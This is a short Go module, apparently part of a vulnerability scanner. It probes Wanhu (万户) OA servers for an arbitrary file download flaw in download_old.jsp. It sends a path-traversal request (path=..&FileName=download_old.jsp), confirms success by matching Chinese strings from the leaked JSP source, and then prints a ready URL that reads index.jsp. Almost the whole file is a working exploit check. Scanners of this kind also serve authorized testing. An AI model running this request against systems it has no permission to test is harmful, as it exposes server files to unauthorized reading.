package wanhu_download_old

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(8 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/defaultroot/download_old.jsp?path=..&name=%F0%9F%90%B6&FileName=download_old.jsp"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).
		Get(vulnUrl)
	if err == nil && resp.StatusCode == 200 {
		body := resp.String()
		if strings.Contains(body, "UTF-8编码") && strings.Contains(body, "得到文件名字和路径") {
			return true
		}
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		cheurl := url + "/defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp"
		color.Green.Println("[+04] 万户OA download_old.jsp 任意文件下载漏洞存在 -> ", cheurl)
	} else {
		color.Red.Println("[+04] 万户OA download_old.jsp 任意文件下载漏洞不存在")
	}

}
